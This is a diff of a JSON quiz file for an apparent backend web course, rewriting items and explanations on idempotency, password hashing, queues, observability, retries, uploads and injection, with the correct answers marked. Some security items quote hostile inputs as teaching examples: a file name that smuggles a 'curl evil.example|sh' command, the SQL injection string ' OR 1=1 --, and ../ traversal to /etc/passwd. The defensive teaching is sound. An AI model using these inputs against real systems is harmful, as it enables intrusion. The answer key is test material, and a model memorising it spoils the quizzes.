@@ -496,29 +496,29 @@
     "id": "t222-a1",
     "concept": "stateless",
     "type": "multiple_choice",
-    "prompt": "What makes a web server “stateless” in this sense?",
+    "prompt": "A team with 6 app servers moves sessions from server memory into a shared store. A reviewer now calls the servers “stateless”. What does that mean?",
     "choices": [
      {
       "id": "a",
-      "label": "It keeps no per-user data in its own memory between requests"
+      "label": "Any server can handle any request; state lives in the store"
      },
      {
       "id": "b",
-      "label": "It forgets the user after every single page"
+      "label": "The app forgets who the user is after each page"
      },
      {
       "id": "c",
-      "label": "It never reads anything from a database"
+      "label": "No per-user data is kept anywhere, not even in a database"
      },
      {
       "id": "d",
-      "label": "It does not use cookies at all for anything"
+      "label": "The servers no longer send or accept cookies"
      }
     ],
     "correctChoiceIds": [
      "a"
     ],
-    "explanation": "State moves to a shared store or the request itself, so any server can answer."
+    "explanation": "Stateless means no per-user state in a server’s own memory between requests. The state still exists, in the shared store or a signed token, so the load balancer can send a user anywhere. Users stay logged in, data still lives in databases, and a cookie still carries the session id."
    },
    {
     "id": "t222-a2",
@@ -546,7 +546,7 @@
     "correctChoiceIds": [
      "c"
     ],
-    "explanation": "Deleting server-side entries invalidates them immediately."
+    "explanation": "Deleting the user’s entries in the session store logs out every device on its next request. Tokens kept only in the browser cannot be reached from the server, sticky sessions still need a shared record to delete, and long-lived tokens without a revocation list stay valid until they expire."
    },
    {
     "id": "t222-a3",
@@ -574,7 +574,7 @@
     "correctChoiceIds": [
      "c"
     ],
-    "explanation": "The id is a pointer; the data stays on the server side."
+    "explanation": "The cookie holds a long random id that means nothing on its own; the data stays on the server side, so logout can delete it. A signed id and role is a token design that cannot be revoked without a lookup, a full cart soon passes the roughly 4 KB cookie limit, and a password hash should not leave the server."
    },
    {
     "id": "t222-a4",
@@ -602,7 +602,7 @@
     "correctChoiceIds": [
      "c"
     ],
-    "explanation": "Short lives plus refresh tokens balance revocation against lookups."
+    "explanation": "A self-contained token verifies until it expires, so revoking one early needs a lookup on every request. A life of about 15 minutes caps how long a stolen token works, and refresh tokens, which are checked, renew it. Signatures do not stop verifying by themselves, size does not depend on lifetime, and browsers do not delete tokens on a timer."
    },
    {
     "id": "t222-a5",
@@ -1385,57 +1385,57 @@
     "id": "t224-a1",
     "concept": "why-idempotency",
     "type": "multiple_choice",
-    "prompt": "Why can a client not just avoid retrying writes?",
+    "prompt": "A “pay ₹500” call times out after 10 s with no response. What does the client actually know?",
     "choices": [
      {
       "id": "a",
-      "label": "HTTP forbids timeouts on writes"
+      "label": "The payment failed, so sending it again is safe"
      },
      {
       "id": "b",
-      "label": "It cannot tell a lost request from a lost response"
+      "label": "The payment succeeded, since no error came back"
      },
      {
       "id": "c",
-      "label": "Servers require at least two attempts"
+      "label": "Nothing yet: the request or the reply may be lost"
      },
      {
       "id": "d",
-      "label": "Retries are always faster than waiting"
+      "label": "The server is down, so it should wait an hour"
      }
     ],
     "correctChoiceIds": [
-     "b"
+     "c"
     ],
-    "explanation": "A timeout leaves the outcome unknown; retrying is the only way to find out."
+    "explanation": "A timeout cannot tell “never arrived” from “charged, but the reply was lost”. Assuming failure risks a double charge, assuming success risks a missing payment, and a timeout says nothing about the server being down. That is why the retry carries the same idempotency key: the server can answer “already done”."
    },
    {
     "id": "t224-a2",
     "concept": "natural-idempotency",
     "type": "multiple_choice",
-    "prompt": "Which of these request handlers is naturally idempotent?",
+    "prompt": "A delivery app retries each of these handlers once after a lost reply, with no idempotency key. Which one is still correct after the retry?",
     "choices": [
      {
       "id": "a",
-      "label": "Set the order’s status to “shipped”"
+      "label": "Set order 77’s status to “delivered”"
      },
      {
       "id": "b",
-      "label": "Append a line to the order history"
+      "label": "Append “rider assigned” to order 77’s history"
      },
      {
       "id": "c",
-      "label": "Charge the card 500 rupees"
+      "label": "Credit the rider ₹40 for order 77"
      },
      {
       "id": "d",
-      "label": "Add 1 to the item’s stock count"
+      "label": "Add 1 to the rider’s completed-orders count"
      }
     ],
     "correctChoiceIds": [
      "a"
     ],
-    "explanation": "Setting a final value repeats safely; increments and appends do not."
+    "explanation": "Setting a final value leaves the same state however many times it runs. The append writes a second history line, the credit pays ₹80 and the increment counts two deliveries; those need an idempotency key or a conditional update."
    },
    {
     "id": "t224-a3",
@@ -1463,7 +1463,7 @@
     "correctChoiceIds": [
      "b"
     ],
-    "explanation": "Without an in-progress state, two copies of the operation can run at once."
+    "explanation": "Record the key as in progress before acting; a retry that finds it in progress waits or gets 409, then receives the stored result once the first finishes. Running both risks two charges, ignoring the key defeats its purpose, and deleting it throws away the only record that the work started."
    },
    {
     "id": "t224-a4",
@@ -1491,7 +1491,7 @@
     "correctChoiceIds": [
      "c"
     ],
-    "explanation": "Store a request hash with the key and reject mismatches."
+    "explanation": "Store a hash of the request with the key and reject a mismatch with an error such as 422, so the client learns it reused a key. Replaying the old response silently drops the new amount, charging the difference invents an operation nobody asked for, and treating it as new breaks the rule that one key means one operation."
    },
    {
     "id": "t224-a5",
@@ -1830,7 +1830,7 @@
     "id": "t225-a1",
     "concept": "password-hashing",
     "type": "multiple_choice",
-    "prompt": "How should passwords be stored?",
+    "prompt": "Your user table leaks in a breach. Which way of storing passwords makes the leak least useful to the attacker?",
     "choices": [
      {
       "id": "a",
@@ -1838,21 +1838,21 @@
      },
      {
       "id": "b",
-      "label": "A slow, salted password hash such as Argon2id, scrypt or bcrypt"
+      "label": "Argon2id hashes, each with its own salt"
      },
      {
       "id": "c",
-      "label": "Plain text in a separate table with strict access"
+      "label": "Plain text in a separate, locked-down table"
      },
      {
       "id": "d",
-      "label": "A fast hash such as SHA-256 without a salt"
+      "label": "Unsalted SHA-256 hashes of each password"
      }
     ],
     "correctChoiceIds": [
      "b"
     ],
-    "explanation": "Slow, salted hashes make stolen hashes expensive to crack."
+    "explanation": "A slow, salted hash forces the attacker to guess each user’s password separately, and every guess costs real time and memory. A key on the same server usually leaks with the data, a locked-down table is plain text once stolen, and unsalted SHA-256 can be tried at billions of guesses per second on one GPU and matched against precomputed tables."
    },
    {
     "id": "t225-a2",
@@ -1880,63 +1880,63 @@
     "correctChoiceIds": [
      "b"
     ],
-    "explanation": "Authentication alone does not grant access to every record."
+    "explanation": "Being logged in proves identity, not ownership: the server must check that order 88 belongs to this user, or that their role allows it, on every request. Requests can be sent from anywhere, not just your page, and a well-formed id says nothing about who owns it."
    },
    {
     "id": "t225-a3",
     "concept": "authn-vs-authz",
     "type": "multiple_choice",
-    "prompt": "Which is an authorisation decision?",
+    "prompt": "A support agent asks to refund ₹8,000 on order 88. Which check is the authorisation decision?",
     "choices": [
      {
       "id": "a",
-      "label": "Whether the one-time code is correct"
+      "label": "The agent’s password matches the stored hash"
      },
      {
       "id": "b",
-      "label": "Whether the passkey signature verifies"
+      "label": "The agent’s passkey signature verifies"
      },
      {
       "id": "c",
-      "label": "Whether the password matches"
+      "label": "The one-time code from the agent’s phone is right"
      },
      {
       "id": "d",
-      "label": "Whether this user may refund this order"
+      "label": "This agent may refund ₹8,000 on this order"
      }
     ],
     "correctChoiceIds": [
      "d"
     ],
-    "explanation": "The others establish identity."
+    "explanation": "The password, the passkey and the one-time code each prove who the agent is: authentication. Whether that identity may perform this action on this resource, for example above a ₹5,000 support limit, is authorisation, and it is decided on every request."
    },
    {
     "id": "t225-a4",
     "concept": "password-hashing",
     "type": "multiple_choice",
-    "prompt": "Why add a unique salt per user?",
+    "prompt": "Two users both chose the password Mumbai@123. The hashes have no per-user salt. What does an attacker who steals the table learn?",
     "choices": [
      {
       "id": "a",
-      "label": "It lets the server decrypt the password when needed"
+      "label": "They share a password, so one crack opens both"
      },
      {
       "id": "b",
-      "label": "It makes each hash faster to compute at login time"
+      "label": "Nothing, as a slow hash hides equal inputs"
      },
      {
       "id": "c",
-      "label": "It removes the need for a slow hashing function"
+      "label": "The password itself, by reversing the hash"
      },
      {
       "id": "d",
-      "label": "Equal passwords hash differently, defeating precomputed tables"
+      "label": "That both accounts were created the same day"
      }
     ],
     "correctChoiceIds": [
-     "d"
+     "a"
     ],
-    "explanation": "Salts defeat precomputed tables and reveal nothing about shared passwords."
+    "explanation": "Without a salt, equal passwords give equal hashes, so one successful guess unlocks every account with that password and precomputed tables work. A slow hash alone does not hide equality, hashes are guessed rather than reversed, and a hash holds no sign-up date. A unique salt per user makes every hash different."
    },
    {
     "id": "t225-a5",
@@ -2703,35 +2703,35 @@
     "correctChoiceIds": [
      "a"
     ],
-    "explanation": "The user does not need to wait for the email to be sent."
+    "explanation": "Enqueue the job and respond within milliseconds; a worker sends the email. Sending first makes every sign-up wait 2 s, skipping it when busy loses emails exactly at peak, and the client cannot send through your email provider without your credentials."
    },
    {
     "id": "t227-a2",
     "concept": "at-least-once",
     "type": "multiple_choice",
-    "prompt": "Why must jobs be idempotent?",
+    "prompt": "A worker sends an “order confirmed” SMS, then crashes before acknowledging the job. What happens next?",
     "choices": [
      {
       "id": "a",
-      "label": "Idempotent jobs use less memory on the workers"
+      "label": "The job is delivered again, so a second SMS can go out"
      },
      {
       "id": "b",
-      "label": "Queues always deliver every job exactly twice"
+      "label": "The job is lost, because its worker crashed"
      },
      {
       "id": "c",
-      "label": "Each worker runs every job on two threads at once"
+      "label": "The queue skips it, since the SMS was already sent"
      },
      {
       "id": "d",
-      "label": "A job can be delivered again after a worker crashes before acknowledging"
+      "label": "A second worker had already been running it too"
      }
     ],
     "correctChoiceIds": [
-     "d"
+     "a"
     ],
-    "explanation": "At-least-once delivery means duplicates are possible."
+    "explanation": "The job was never acknowledged, so when its lease runs out the queue hands it to another worker, and without a check such as a per-order message id the customer gets a second SMS. That is at-least-once delivery. Nothing is lost because the acknowledgement comes last, the queue cannot know the SMS went out, and only one worker held the lease."
    },
    {
     "id": "t227-a3",
@@ -2759,17 +2759,17 @@
     "correctChoiceIds": [
      "c"
     ],
-    "explanation": "Permanent failures need a person, not more retries."
+    "explanation": "Malformed data fails the same way on every attempt, so after a few tries the job goes to a dead-letter queue where a person can inspect, fix and replay it. Retrying at once only burns worker time, deleting it loses the evidence, and restarting workers does not fix the data."
    },
    {
     "id": "t227-a4",
     "concept": "scheduling",
     "type": "multiple_choice",
-    "prompt": "A nightly report is scheduled on each of 4 servers. What happens?",
+    "prompt": "A nightly GST invoice job is added to the scheduler on each of 4 app servers. What happens at midnight?",
     "choices": [
      {
       "id": "a",
-      "label": "It never runs because the servers conflict"
+      "label": "It fails, because the servers conflict"
      },
      {
       "id": "b",
@@ -2777,17 +2777,17 @@
      },
      {
       "id": "c",
-      "label": "It runs once and the others wait"
+      "label": "It runs once while the others wait"
      },
      {
       "id": "d",
-      "label": "The report runs 4 times"
+      "label": "It runs 4 times: four invoices each"
      }
     ],
     "correctChoiceIds": [
      "d"
     ],
-    "explanation": "Each scheduler fires independently."
+    "explanation": "Each server’s scheduler fires on its own, so every customer receives four invoices. Nothing coordinates the servers unless you add it: one scheduler that enqueues a single job, or a lock that only one instance can take."
    },
    {
     "id": "t227-a5",
@@ -3123,19 +3123,19 @@
     "id": "t228-a1",
     "concept": "config-vs-code",
     "type": "multiple_choice",
-    "prompt": "Which value is configuration rather than code?",
+    "prompt": "The same build runs in staging and in production. Which of these should differ between them, supplied at deploy time?",
     "choices": [
      {
       "id": "a",
-      "label": "The function that calculates tax"
+      "label": "The function that calculates GST on an order"
      },
      {
       "id": "b",
-      "label": "The validation rules for a sign-up form"
+      "label": "The validation rules for the sign-up form"
      },
      {
       "id": "c",
-      "label": "The production database host name"
+      "label": "The payment provider’s API base URL"
      },
      {
       "id": "d",
@@ -3145,7 +3145,7 @@
     "correctChoiceIds": [
      "c"
     ],
-    "explanation": "It varies between deploys of the same build."
+    "explanation": "The provider URL (sandbox in staging, live in production) varies by environment, so it is configuration. Tax logic, validation rules and middleware order are behaviour: if they differed, staging would be testing different code from what production runs."
    },
    {
     "id": "t228-a2",
@@ -3173,35 +3173,35 @@
     "correctChoiceIds": [
      "c"
     ],
-    "explanation": "Deleting from the latest commit leaves it in history."
+    "explanation": "Every clone and the history still contain it, so anyone with access, now or later, has a working password. Rotate it (issue a new one and revoke the old) and then clean the history if you wish. Making the repository private or renaming the variable leaves the old value valid."
    },
    {
     "id": "t228-a3",
     "concept": "twelve-factor",
     "type": "multiple_choice",
-    "prompt": "What does twelve-factor say about logs?",
+    "prompt": "A service writes logs to a file inside each container, and containers are replaced on every deploy. What does twelve-factor suggest?",
     "choices": [
      {
       "id": "a",
-      "label": "Each process manages its own rotating log files"
+      "label": "Rotate the log files more often in each container"
      },
      {
       "id": "b",
-      "label": "Send each log line directly to an email inbox"
+      "label": "Email every error line to the on-call engineer"
      },
      {
       "id": "c",
-      "label": "Log only errors, to save as much disk space as possible"
+      "label": "Log only errors, to save disk in the container"
      },
      {
       "id": "d",
-      "label": "Write them as an event stream to standard output for the platform"
+      "label": "Write to standard output; the platform routes it"
      }
     ],
     "correctChoiceIds": [
      "d"
     ],
-    "explanation": "The environment captures and routes the stream."
+    "explanation": "Files inside a replaced container disappear with it. An event stream on standard output lets the platform collect, route and keep logs from every instance in one place. Rotation keeps files that still vanish, email does not scale past a handful of errors, and logging only errors removes the context you need in an incident."
    },
    {
     "id": "t228-a4",
@@ -3229,7 +3229,7 @@
     "correctChoiceIds": [
      "c"
     ],
-    "explanation": "Failing fast surfaces the problem at deploy time, not under traffic."
+    "explanation": "Refusing to start, naming the setting, surfaces the problem during the deploy, when rolling back is easy. A silent default may point at the wrong database, endless retrying looks like a hang, and failing on the first request moves the outage onto real traffic."
    },
    {
     "id": "t228-a5",
@@ -3503,7 +3503,7 @@
     "id": "t229-c2",
     "kind": "text",
     "title": "Misconception: the average latency describes users",
-    "body": "An average of 120 ms can hide that 1 in 100 requests takes 3 seconds. Percentiles show the tail: p50 is the median, p99 is the value 99% of requests beat. Users who make many requests per page are likely to hit the tail.",
+    "body": "An average of 120 ms can hide that 1 in 100 requests takes 3 seconds. Percentiles show the tail: p50 is the median, and p99 is the value 99% of requests are at or below. Users who make many requests per page are likely to hit the tail.",
     "teaches": [
      "percentiles"
     ]
@@ -3547,7 +3547,7 @@
     "id": "t229-c6",
     "kind": "text",
     "title": "Edge case: averaging percentiles",
-    "body": "The p99 of a fleet is not the average of each server’s p99. One overloaded server with p99 of 3 s and nine healthy ones at 200 ms average to 480 ms, hiding that a tenth of users wait seconds. Aggregate raw histograms (bucket counts) across servers and compute the percentile from the merged data.",
+    "body": "The p99 of a fleet is not the average of each server’s p99. One overloaded server with a p99 of 3 s and nine healthy ones at 200 ms average to 480 ms, a number that describes no server: it understates the sick one and overstates the rest. Aggregate raw histograms (bucket counts) across servers and compute the percentile from the merged data.",
     "teaches": [
      "logs-vs-metrics"
     ]
@@ -3580,7 +3580,7 @@
     "correctChoiceIds": [
      "a"
     ],
-    "explanation": "Aggregates over time are what metrics are for."
+    "explanation": "A metric aggregates over time, so it answers “is the error rate unusual right now?” cheaply. Why one order failed, what a provider replied and who changed a setting are questions about single events, which is what logs (or an audit log) record."
    },
    {
     "id": "t229-a2",
@@ -3608,7 +3608,7 @@
     "correctChoiceIds": [
      "c"
     ],
-    "explanation": "Percentiles describe the distribution, including the tail."
+    "explanation": "Half the requests finish within 80 ms, and 1 in 100 takes 2 s or more. So most requests are fast, not slow; the average is not shown, and with a median of 80 ms it is far below 2 s; and p99 is a position in the distribution, not a count of requests."
    },
    {
     "id": "t229-a3",
@@ -3636,35 +3636,35 @@
     "correctChoiceIds": [
      "c"
     ],
-    "explanation": "Fields let you search by request, order or provider."
+    "explanation": "Fields such as request_id and order_id let you filter thousands of lines down to one request. A line number, or a pointer to a stack trace “above”, breaks as soon as lines from many requests interleave, and “something went wrong” gives you nothing to search for."
    },
    {
     "id": "t229-a4",
     "concept": "golden-signals",
     "type": "multiple_choice",
-    "prompt": "Which metric label is safe to add?",
+    "prompt": "A team wants to break down a checkout latency metric. Which label can they add without risking millions of time series?",
     "choices": [
      {
       "id": "a",
-      "label": "HTTP status class (2xx, 4xx, 5xx)"
+      "label": "Status class: 2xx, 4xx or 5xx"
      },
      {
       "id": "b",
-      "label": "Request id"
+      "label": "The request id of each call"
      },
      {
       "id": "c",
-      "label": "Full request URL with query string"
+      "label": "The full URL with its query string"
      },
      {
       "id": "d",
-      "label": "User id"
+      "label": "The id of the signed-in user"
      }
     ],
     "correctChoiceIds": [
      "a"
     ],
-    "explanation": "Small, bounded label sets keep the number of time series manageable."
+    "explanation": "Status class has three values, so it multiplies the series by three at most. A request id or a user id creates one series per value, millions during a big sale, and full URLs with query strings are effectively unbounded. Put those details in logs or traces."
    },
    {
     "id": "t229-a5",
@@ -3964,57 +3964,57 @@
     "id": "t230-a1",
     "concept": "classify",
     "type": "multiple_choice",
-    "prompt": "Which failure is worth retrying?",
+    "prompt": "An order service calls a payment gateway. Which response should it retry automatically, with the same idempotency key?",
     "choices": [
      {
       "id": "a",
-      "label": "400 Bad Request with a missing field"
+      "label": "400 Bad Request: the amount is missing"
      },
      {
       "id": "b",
-      "label": "503 Service Unavailable with Retry-After: 2"
+      "label": "503 Service Unavailable, Retry-After: 2"
      },
      {
       "id": "c",
-      "label": "404 Not Found for a deleted order"
+      "label": "404 Not Found: unknown merchant id"
      },
      {
       "id": "d",
-      "label": "422 Unprocessable Content for a bad date"
+      "label": "422 Unprocessable Content: card expired"
      }
     ],
     "correctChoiceIds": [
      "b"
     ],
-    "explanation": "Only transient failures can succeed on a later attempt."
+    "explanation": "A 503 with Retry-After says the gateway cannot serve right now and when to try again; reusing the idempotency key makes the retry safe. A missing field, an unknown merchant and an expired card fail the same way on every attempt, so retrying them only adds load."
    },
    {
     "id": "t230-a2",
     "concept": "backoff-jitter",
     "type": "multiple_choice",
-    "prompt": "Why add jitter to backoff?",
+    "prompt": "A payment provider recovers from a 30-second outage. Its 50,000 clients all back off by exactly 1, 2, 4 and 8 s. What happens, and what is the fix?",
     "choices": [
      {
       "id": "a",
-      "label": "To make the total time spent retrying shorter"
+      "label": "Load spreads out by itself as the waits grow"
      },
      {
       "id": "b",
-      "label": "To make each retry faster"
+      "label": "Retries arrive in synchronised waves; add jitter"
      },
      {
       "id": "c",
-      "label": "So many clients do not retry at the same instants"
+      "label": "Retries succeed in order, so nothing needs fixing"
      },
      {
       "id": "d",
-      "label": "To guarantee the retry succeeds"
+      "label": "The waits are too long; retry every 1 s instead"
      }
     ],
     "correctChoiceIds": [
-     "c"
+     "b"
     ],
-    "explanation": "Synchronised retries create load spikes; randomness spreads them."
+    "explanation": "Clients that failed together wait the same 1, 2, 4 and 8 s and retry together, so each wave hits the recovering service at once. Jitter randomises each wait so the retries spread across the interval. Growing waits alone do not desynchronise anyone, and fixed 1 s retries make the waves arrive more often."
    },
    {
     "id": "t230-a3",
@@ -4042,7 +4042,7 @@
     "correctChoiceIds": [
      "b"
     ],
-    "explanation": "3³ = 27."
+    "explanation": "Each layer multiplies the one below: three layers of 3 attempts make 27 attempts on the data store from one click, just when it is down. 9 counts only two layers, 81 would need four, and 3 is what you get when only one layer retries, which is the fix."
    },
    {
     "id": "t230-a4",
@@ -4070,7 +4070,7 @@
     "correctChoiceIds": [
      "a"
     ],
-    "explanation": "Details stay in server logs, found via the request id."
+    "explanation": "Return a generic message, a stable error code and the request id; the stack trace stays in the server logs, found by that id. Configuration, stack traces and SQL tell an attacker your software versions, table names and query shapes."
    },
    {
     "id": "t230-a5",
@@ -4395,7 +4395,7 @@
     "id": "t231-a1",
     "concept": "compatible-changes",
     "type": "multiple_choice",
-    "prompt": "Which change is backward compatible for existing clients?",
+    "prompt": "An orders API has 40 client apps you cannot update. Which change can ship without a new version?",
     "choices": [
      {
       "id": "a",
@@ -4407,17 +4407,17 @@
      },
      {
       "id": "c",
-      "label": "Making an optional request field required"
+      "label": "Making the optional “gstin” field required"
      },
      {
       "id": "d",
-      "label": "Adding an optional field to the response"
+      "label": "Adding an optional “delivery_slot” to responses"
      }
     ],
     "correctChoiceIds": [
      "d"
     ],
-    "explanation": "Additions that nobody must send or read are safe."
+    "explanation": "Clients that ignore unknown fields keep working when a field is added. A rename removes the field they read, a type change breaks their parsing, and a newly required input makes their existing requests fail validation. Additions are safe only if clients tolerate unknown fields, so publish that rule."
    },
    {
     "id": "t231-a2",
@@ -4445,7 +4445,7 @@
     "correctChoiceIds": [
      "a"
     ],
-    "explanation": "410 says the resource is intentionally gone; a blind redirect can change meaning."
+    "explanation": "410 Gone says the resource was removed on purpose, and the link tells developers where to go. Keeping 200 means the sunset never really happens, 500 blames your server for a planned change, and a blind 301 to v2 can silently change meaning, for example if v2 amounts are in paise rather than rupees."
    },
    {
     "id": "t231-a3",
@@ -4479,29 +4479,29 @@
     "id": "t231-a4",
     "concept": "compatible-changes",
     "type": "multiple_choice",
-    "prompt": "Adding a new value to a status enum is risky because…",
+    "prompt": "A payments API adds the status “partially_refunded”. A merchant app maps the status into a fixed list of three values. What happens?",
     "choices": [
      {
       "id": "a",
-      "label": "servers must send every value twice"
+      "label": "The app keeps showing the last status it knew"
      },
      {
       "id": "b",
-      "label": "enums cannot be changed in any API"
+      "label": "The numeric codes of the other statuses shift"
      },
      {
       "id": "c",
-      "label": "clients with a fixed list of values may fail on the new one"
+      "label": "The app can fail on the value it does not know"
      },
      {
       "id": "d",
-      "label": "old clients will start sending the new value"
+      "label": "The app starts sending the new value back"
      }
     ],
     "correctChoiceIds": [
      "c"
     ],
-    "explanation": "Tell clients to handle unknown values, and announce new ones."
+    "explanation": "A client with a fixed list may reject the whole response or crash on an unknown value. Nothing shifts when statuses are sent as strings, the app has no earlier status to fall back on for this payment, and old clients cannot send a value they have never heard of. Announce new values and require clients to handle unknown ones, for example as “other”."
    },
    {
     "id": "t231-a5",
@@ -4860,35 +4860,35 @@
     "correctChoiceIds": [
      "c"
     ],
-    "explanation": "The server authorises; storage carries the bytes."
+    "explanation": "The API decides who may upload what and signs a URL valid for minutes; storage then carries the bytes, so a 2 GB video never passes through your app servers. Signed URLs do not shrink files, the file still needs scanning afterwards, and storage also accepts uploads relayed through your server."
    },
    {
     "id": "t232-a2",
     "concept": "upload-validation",
     "type": "multiple_choice",
-    "prompt": "How should the server decide an upload’s real file type?",
+    "prompt": "A profile-photo endpoint receives avatar.png sent as Content-Type: image/png. Its first bytes are <html><script>. What should the server do?",
     "choices": [
      {
       "id": "a",
-      "label": "Accept any type and rename it to .txt"
+      "label": "Accept it, because the header says PNG"
      },
      {
       "id": "b",
-      "label": "Trust the Content-Type header sent by the client"
+      "label": "Accept it, because the name ends in .png"
      },
      {
       "id": "c",
-      "label": "Trust the file extension"
+      "label": "Reject it: the content is not an allowed image"
      },
      {
       "id": "d",
-      "label": "Inspect the content (magic bytes) and allow only expected types"
+      "label": "Accept it and rename the file to avatar.txt"
      }
     ],
     "correctChoiceIds": [
-     "d"
+     "c"
     ],
-    "explanation": "Uploader-supplied names and headers can lie."
+    "explanation": "The name and the Content-Type are chosen by the uploader; the first bytes (the file’s magic number) show what it really is, and here it is HTML. Accepting it lets a script be served from your storage, and renaming it keeps attacker HTML that a client sniffing the content may still render."
    },
    {
     "id": "t232-a3",
@@ -4916,7 +4916,7 @@
     "correctChoiceIds": [
      "c"
     ],
-    "explanation": "Parts are uploaded and retried independently."
+    "explanation": "Parts are uploaded and retried on their own, so a drop costs one part. A single request restarts from zero, compressing video saves little because it is already compressed, and an hour-long timeout does not help when the connection itself drops."
    },
    {
     "id": "t232-a4",
@@ -4944,7 +4944,7 @@
     "correctChoiceIds": [
      "a"
     ],
-    "explanation": "A separate origin stops an uploaded HTML or script file running with your site’s cookies."
+    "explanation": "A separate domain (a different site, not a subdomain that shares cookies), with Content-Disposition: attachment and a safe content type, stops an uploaded HTML or script file running with your site’s cookies. Serving it inline from the main domain is stored XSS, keeping the original name lets uploaders choose the extension, and the code folder could let uploads execute."
    },
    {
     "id": "t232-a5",
@@ -5667,29 +5667,29 @@
     "id": "t234-a1",
     "concept": "parameterised",
     "type": "multiple_choice",
-    "prompt": "What is the main defence against SQL injection?",
+    "prompt": "A security review finds a search endpoint that builds SQL by joining in the user’s text. Which proposed fix actually closes the hole?",
     "choices": [
      {
       "id": "a",
-      "label": "Parameterised queries (prepared statements) with bound values"
+      "label": "Send the text as a bound query parameter"
      },
      {
       "id": "b",
-      "label": "Hiding database error messages from the client"
+      "label": "Escape single quotes in the text first"
      },
      {
       "id": "c",
-      "label": "Escaping single quotes in the input by hand"
+      "label": "Hide database errors from the response"
      },
      {
       "id": "d",
-      "label": "Limiting every input to at most 50 characters"
+      "label": "Cap the search text at 50 characters"
      }
     ],
     "correctChoiceIds": [
      "a"
     ],
-    "explanation": "Values sent separately are never parsed as SQL."
+    "explanation": "A bound parameter is never parsed as SQL, whatever it contains. Hand escaping misses numeric contexts and dialect quirks, hiding errors only makes the attack blind (blind injection still works), and 50 characters is plenty for ' OR 1=1 -- ."
    },
    {
     "id": "t234-a2",
@@ -5717,63 +5717,63 @@
     "correctChoiceIds": [
      "b"
     ],
-    "explanation": "Dot-dot segments climb out of the intended folder."
+    "explanation": "The ../ segments climb from /data/uploads/ to /etc/passwd unless the server resolves the full path and checks it is still inside the folder. A plain name, a space encoded as %20 and a name with hyphens are all harmless."
    },
    {
     "id": "t234-a3",
     "concept": "injection",
     "type": "multiple_choice",
-    "prompt": "Which of these is also an injection risk?",
+    "prompt": "An image service resizes uploads by running a shell command string that includes the file name. Someone uploads a file named x.jpg;curl evil.example|sh. Which change removes the injection?",
     "choices": [
      {
       "id": "a",
-      "label": "Returning user input as JSON with correct encoding"
+      "label": "Call the resize program with an argument list, no shell"
      },
      {
       "id": "b",
-      "label": "Hashing user input with a password hash"
+      "label": "Strip semicolons from file names before running it"
      },
      {
       "id": "c",
-      "label": "Storing user input in a database column with a bound parameter"
+      "label": "Wrap the file name in double quotes inside the string"
      },
      {
       "id": "d",
-      "label": "Passing user input to a shell command string"
-     }
-    ],
-    "correctChoiceIds": [
-     "d"
-    ],
-    "explanation": "A shell interprets special characters as commands."
-   },
-   {
-    "id": "t234-a4",
-    "concept": "least-privilege",
-    "type": "multiple_choice",
-    "prompt": "Why should the app’s database account lack DROP and admin rights?",
-    "choices": [
-     {
-      "id": "a",
-      "label": "A successful injection can then do only what the app could do"
-     },
-     {
-      "id": "b",
-      "label": "It makes the application’s queries run faster"
-     },
-     {
-      "id": "c",
-      "label": "Parameterised queries require a restricted account"
-     },
-     {
-      "id": "d",
-      "label": "Databases forbid admin accounts for applications"
+      "label": "Run the command only for logged-in users"
      }
     ],
     "correctChoiceIds": [
      "a"
     ],
-    "explanation": "Least privilege limits damage when another defence fails."
+    "explanation": "With an argument list no shell parses the name, so ; | and $( ) are just characters. Stripping semicolons misses |, && , $( ) and backticks; double quotes still expand $( ) and backticks; and being logged in says nothing about what a name contains. Better still, use an image library and store files under generated names."
+   },
+   {
+    "id": "t234-a4",
+    "concept": "least-privilege",
+    "type": "multiple_choice",
+    "prompt": "One old report endpoint still concatenates SQL and gets injected. The app connects as a database superuser. What would least privilege have changed?",
+    "choices": [
+     {
+      "id": "a",
+      "label": "The attacker could do only what the app’s account may do"
+     },
+     {
+      "id": "b",
+      "label": "The injection would be blocked before reaching the database"
+     },
+     {
+      "id": "c",
+      "label": "The app’s queries would run faster with fewer rights"
+     },
+     {
+      "id": "d",
+      "label": "Bound parameters would start working on the old endpoint"
+     }
+    ],
+    "correctChoiceIds": [
+     "a"
+    ],
+    "explanation": "Least privilege does not stop the injection; it caps the damage. With only SELECT, INSERT and UPDATE on its own tables, the attacker cannot drop tables or read other schemas the way a superuser can. Privileges do not change query speed or how the old endpoint builds its SQL."
    },
    {
     "id": "t234-a5",
